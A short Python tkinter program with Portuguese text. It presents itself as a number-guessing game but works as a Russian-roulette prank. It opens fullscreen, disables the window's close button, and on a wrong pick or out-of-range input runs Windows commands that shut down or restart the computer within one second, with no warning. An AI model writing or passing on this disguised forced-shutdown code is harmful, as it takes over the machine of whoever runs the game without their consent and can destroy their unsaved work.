import os
import random
import tkinter as tk
from tkinter import messagebox

def jogar():
    num = random.randint(1, 5)
    try:
        tiro = int(entry_numero.get())
        if tiro < 1 or tiro > 5:
            messagebox.showwarning("Atenção", "Escolha um número entre 1 e 5.")
            resultado.set("Não brinque com coisa séria")
            os.system("shutdown /s /t 1")
            os.system("shutdown /r /t 1")
        elif tiro == num:
            resultado.set("Perdeu!")
            os.system("shutdown /s /t 1")
            #messagebox.showinfo("Resultado", "Você perdeu!")
        else:
            resultado.set("Está vivo!")
            messagebox.showinfo("Resultado", "Está vivo!")
        btn_novo_jogo.pack(pady=5)  # Mostrar o botão "Jogar novamente" após a jogada
    except ValueError:
        messagebox.showerror("Erro", "Por favor, insira um número válido.")

def jogar_denovo():
    entry_numero.delete(0, tk.END)
    resultado.set("")
    btn_novo_jogo.pack_forget()  # Esconder o botão "Jogar novamente"

def bloquear_fechamento():
    pass  # Função vazia que impede o fechamento

# Configuração da janela
janela = tk.Tk()
janela.title("Jogo de Adivinhação")

# Configurar para tela cheia
janela.attributes("-fullscreen", True)

# Bloquear o botão de fechar
janela.protocol("WM_DELETE_WINDOW", bloquear_fechamento)

# Entrada para o número
tk.Label(janela, text="Escolha um número de 1 a 5:").pack(pady=10)
entry_numero = tk.Entry(janela)
entry_numero.pack()

# Botão de jogar
btn_jogar = tk.Button(janela, text="Jogar", command=jogar)
btn_jogar.pack(pady=5)

# Resultado do jogo
resultado = tk.StringVar()
resultado.set("")
label_resultado = tk.Label(janela, textvariable=resultado)
label_resultado.pack(pady=10)

# Botão de jogar novamente (inicialmente escondido)
btn_novo_jogo = tk.Button(janela, text="Jogar novamente", command=jogar_denovo)

# Inicia a interface
janela.mainloop()
